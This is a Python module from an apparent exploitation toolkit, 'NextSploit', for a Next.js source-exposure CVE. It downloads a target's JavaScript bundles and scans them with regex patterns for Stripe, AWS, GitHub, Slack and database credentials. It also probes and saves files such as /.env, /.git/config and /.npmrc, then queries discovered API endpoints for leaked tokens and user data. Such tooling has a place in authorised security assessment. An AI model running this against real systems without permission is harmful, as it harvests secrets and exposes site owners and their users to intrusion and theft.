#!/usr/bin/env python3
"""
NextSploit — CVE-2025-55183: Source Code Exposure
From: CVE-2025-55183.py

Exposes source code, API endpoints, and potential secrets via
client-side JS bundles and internal Next.js paths.
Affected: Next.js < 14.2.35
"""

import os
import re
import requests

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, log_status, print_module_header, print_finding,
    create_progress,
)

CVE_ID = "CVE-2025-55183"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Internal Next.js paths to probe
INTERNAL_PATHS = [
    ("/_next/static/", "Static assets directory"),
    ("/_next/static/chunks/", "JS chunks directory"),
    ("/_next/static/css/", "CSS directory"),
    ("/_next/static/media/", "Media assets directory"),
    ("/_next/data/", "Data directory"),
    ("/_next/data/latest.json", "Latest data JSON"),
    ("/__nextjs_original-stack-frame", "Debug stack frames"),
    ("/api", "API root"),
    ("/.env", "Environment file"),
    ("/.env.local", "Local environment file"),
    ("/.env.production", "Production environment file"),
    ("/.git/config", "Git config"),
    ("/.git/HEAD", "Git HEAD"),
    ("/next.config.js", "Next.js config"),
    ("/next.config.mjs", "Next.js config (ESM)"),
    ("/package.json", "Package manifest"),
    ("/tsconfig.json", "TypeScript config"),
    ("/vercel.json", "Vercel config"),
    ("/.npmrc", "NPM config"),
    ("/webpack.config.js", "Webpack config"),
]

# Secret patterns to hunt in JS bundles
SECRET_PATTERNS = [
    (r'["\']sk_(?:live|test)_[a-zA-Z0-9]{20,}["\']', "Stripe Secret Key"),
    (r'["\']pk_(?:live|test)_[a-zA-Z0-9]{20,}["\']', "Stripe Publishable Key"),
    (r'["\'](?:AKIA|ASIA)[A-Z0-9]{16}["\']', "AWS Access Key"),
    (r'["\']ghp_[a-zA-Z0-9]{36}["\']', "GitHub Personal Token"),
    (r'["\']gho_[a-zA-Z0-9]{36}["\']', "GitHub OAuth Token"),
    (r'["\']glpat-[a-zA-Z0-9\-_]{20,}["\']', "GitLab Personal Token"),
    (r'["\']xox[bpors]-[a-zA-Z0-9\-]{10,}["\']', "Slack Token"),
    (r'["\']eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*["\']', "JWT Token"),
    (r'(?:api[_-]?key|apikey)\s*[:=]\s*["\'][a-zA-Z0-9_\-]{16,}["\']', "Generic API Key"),
    (r'(?:password|passwd|secret)\s*[:=]\s*["\'][^"\']{8,}["\']', "Hardcoded Password/Secret"),
    (r'mongodb(?:\+srv)?://[^\s"\']+', "MongoDB Connection String"),
    (r'postgres(?:ql)?://[^\s"\']+', "PostgreSQL Connection String"),
    (r'redis://[^\s"\']+', "Redis Connection String"),
]


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2025-55183 — Source Code Exposure.
    
    Phase 1: Extract and analyze JS/CSS chunks
    Phase 2: Hunt secrets in bundles
    Phase 3: Probe internal Next.js paths
    Phase 4: Discover API endpoints
    """
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")

    os.makedirs("reports", exist_ok=True)
    os.makedirs("reports/chunks", exist_ok=True)

    # ════════════════════════════════════════════════════════════════════
    # Phase 1: Extract JS/CSS chunk references
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 1] Extracting JS/CSS chunk references...")

    try:
        r = session.get(target, timeout=config.timeout)
    except requests.RequestException as e:
        log_error(f"Cannot reach target: {e}")
        result.status = "ERROR"
        result.error = str(e)
        return result

    js_chunks = list(set(re.findall(r'/_next/static/chunks/[^\s"\']+\.js', r.text)))
    css_chunks = list(set(re.findall(r'/_next/static/css/[^\s"\']+\.css', r.text)))

    log_info(f"Found [bold]{len(js_chunks)}[/bold] JS chunks, [bold]{len(css_chunks)}[/bold] CSS chunks")

    # ════════════════════════════════════════════════════════════════════
    # Phase 2: Download chunks and hunt secrets
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 2] Downloading and analyzing JS bundles...")

    all_endpoints = set()
    all_apis = set()
    all_secrets = []
    chunks_to_scan = js_chunks[:25]  # Limit

    with create_progress() as progress:
        task = progress.add_task("Analyzing JS Chunks", total=len(chunks_to_scan))

        for chunk_path in chunks_to_scan:
            progress.update(task, advance=1)
            url = f"{target}{chunk_path}"

            try:
                r_chunk = session.get(url, timeout=config.timeout)
                if r_chunk.status_code != 200:
                    continue

                content = r_chunk.text
                fname = chunk_path.split("/")[-1]
                log_debug(f"[200] {fname} ({len(content)} bytes)")

                # Save chunk
                try:
                    with open(f"reports/chunks/{fname}", "w", errors="ignore") as f:
                        f.write(content)
                except Exception:
                    pass

                # Extract endpoints
                endpoints = re.findall(r'["\'](/[a-zA-Z0-9_\-/]+)["\']', content)
                apis = re.findall(r'["\'](/api/[a-zA-Z0-9_\-/]+)["\']', content)
                routes = re.findall(r'route["\']?\s*[:=]\s*["\'](/[a-zA-Z0-9_\-/]+)["\']', content)

                all_endpoints.update(endpoints)
                all_apis.update(apis)
                all_endpoints.update(routes)

                # Hunt secrets
                for pattern, secret_type in SECRET_PATTERNS:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        secret_entry = {
                            "type": secret_type,
                            "value": match if len(match) < 100 else match[:50] + "...",
                            "source": fname,
                        }
                        all_secrets.append(secret_entry)

                        log_critical(f"SECRET FOUND in {fname}: {secret_type}")
                        print_finding(CVE_ID, f"Exposed {secret_type} in {fname}", secret_entry)

                        result.add_finding(Finding(
                            cve=CVE_ID, severity="CRITICAL",
                            title=f"Exposed Secret: {secret_type}",
                            status="VULNERABLE",
                            detail=f"{secret_type} found in client bundle {fname}",
                            evidence=secret_entry,
                        ))

            except requests.RequestException as e:
                log_trace(f"Error fetching {chunk_path}: {e}")

    # Save discovered endpoints
    if all_endpoints:
        with open("reports/endpoints_found.txt", "w") as f:
            for ep in sorted(all_endpoints):
                f.write(f"{ep}\n")
        log_success(f"Saved {len(all_endpoints)} endpoints to reports/endpoints_found.txt")

    if all_apis:
        with open("reports/api_endpoints_found.txt", "w") as f:
            for ep in sorted(all_apis):
                f.write(f"{ep}\n")
        log_success(f"Saved {len(all_apis)} API endpoints to reports/api_endpoints_found.txt")

    # ════════════════════════════════════════════════════════════════════
    # Phase 3: Probe internal Next.js paths
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 3] Probing internal Next.js paths...")

    with create_progress() as progress:
        task = progress.add_task("Internal Path Probe", total=len(INTERNAL_PATHS))

        for path, desc in INTERNAL_PATHS:
            progress.update(task, advance=1)
            url = f"{target}{path}"

            try:
                r_probe = session.get(url, timeout=config.timeout)
                log_trace(f"[{r_probe.status_code}] {path} ({len(r_probe.text)} bytes)")

                if r_probe.status_code == 200 and len(r_probe.text) > 0:
                    # Check if it's actual content (not a custom 404 page)
                    is_interesting = (
                        path.endswith(('.json', '.js', '.ts', '.mjs', '.env', '.npmrc'))
                        or "git" in path
                    )

                    if is_interesting:
                        detail = f"Exposed: {desc} ({path}) — {len(r_probe.text)} bytes"
                        log_critical(detail)

                        evidence = {
                            "path": path,
                            "description": desc,
                            "status_code": r_probe.status_code,
                            "size": f"{len(r_probe.text)} bytes",
                            "preview": r_probe.text[:300],
                        }

                        # Save
                        safe_fname = path.replace("/", "_").lstrip("_")
                        save_path = f"reports/internal_{safe_fname}"
                        try:
                            with open(save_path, "w", errors="ignore") as f:
                                f.write(r_probe.text)
                            evidence["saved_to"] = save_path
                        except Exception:
                            pass

                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="HIGH",
                            title=f"Exposed: {desc}",
                            status="VULNERABLE", detail=detail,
                            evidence=evidence,
                        ))
                    else:
                        log_debug(f"[200] {path} — {len(r_probe.text)} bytes (may be custom 404)")

            except requests.RequestException:
                pass

    # ════════════════════════════════════════════════════════════════════
    # Phase 4: Probe discovered API endpoints
    # ════════════════════════════════════════════════════════════════════
    if all_apis:
        log_info(f"[Phase 4] Probing {len(all_apis)} discovered API endpoints...")
        apis_to_probe = sorted(all_apis)[:20]

        with create_progress() as progress:
            task = progress.add_task("API Endpoint Probe", total=len(apis_to_probe))

            for api_path in apis_to_probe:
                progress.update(task, advance=1)
                url = f"{target}{api_path}"

                try:
                    r_api = session.get(url, timeout=config.timeout)
                    log_status(r_api.status_code, api_path, f"{len(r_api.text)} bytes")

                    if r_api.status_code == 200 and len(r_api.text) > 10 and len(r_api.text) < 50000:
                        log_debug(f"API response preview: {r_api.text[:200]}")

                        # Check for data leakage
                        text_lower = r_api.text.lower()
                        sensitive = [kw for kw in ["token", "secret", "password", "email", "user"]
                                    if kw in text_lower]
                        if sensitive:
                            detail = f"API data exposure: {api_path} (keywords: {', '.join(sensitive)})"
                            log_warning(detail)
                            result.add_finding(Finding(
                                cve=CVE_ID, severity="MEDIUM",
                                title="API Data Exposure",
                                status="VULNERABLE", detail=detail,
                                evidence={
                                    "api_path": api_path,
                                    "keywords": sensitive,
                                    "preview": r_api.text[:500],
                                },
                            ))

                except requests.RequestException:
                    pass

    # ── Final status ─────────────────────────────────────────────────────
    log_info(f"Total endpoints discovered: [bold]{len(all_endpoints)}[/bold]")
    log_info(f"Total API endpoints: [bold]{len(all_apis)}[/bold]")

    if result.finding_count > 0:
        log_critical(f"Found {result.finding_count} source code exposure issues")
    else:
        log_success("No source code exposure detected")

    return result
